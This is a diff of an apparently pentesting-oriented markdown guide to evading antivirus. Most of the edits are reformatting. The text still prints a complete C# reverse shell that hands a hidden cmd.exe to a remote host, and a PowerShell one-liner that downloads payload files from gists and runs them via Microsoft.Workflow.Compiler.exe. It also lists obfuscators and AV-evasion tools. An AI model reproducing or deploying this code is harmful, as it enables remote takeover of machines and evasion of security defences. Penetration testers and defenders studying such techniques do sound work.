@@ -72,7 +72,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 ## Compiling our own reverse shell
 
- https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+[https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15)
 
 #### First C\# Revershell
 
@@ -101,46 +101,46 @@ using System.Net.Sockets;
 
 namespace ConnectBack
 {
-	public class Program
-	{
-		static StreamWriter streamWriter;
+    public class Program
+    {
+        static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+        public static void Main(string[] args)
+        {
+            using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+            {
+                using(Stream stream = client.GetStream())
+                {
+                    using(StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+                        StringBuilder strInput = new StringBuilder();
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+                        while(true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
 
@@ -156,7 +156,7 @@ namespace ConnectBack
             }
         }
 
-	}
+    }
 }
 ```
 
@@ -182,7 +182,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
 
-{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
+{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" caption="" %}
 
 C\# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
@@ -196,15 +196,15 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 
 [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
 
-Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/
+Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
 
 [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
 
-https://github.com/l0ss/Grouper2
+[https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
 
-{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}
+{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" caption="" %}
 
-{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
+{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" caption="" %}
 
 ## Other tools
 
@@ -235,9 +235,7 @@ https://github.com/praetorian-code/vulcan
 
 ## More
 
-{% embed url="https://github.com/EgeBalci/sgn" %}
+{% embed url="https://github.com/EgeBalci/sgn" caption="" %}
 
-{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}
-
-
+{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" caption="" %}
 
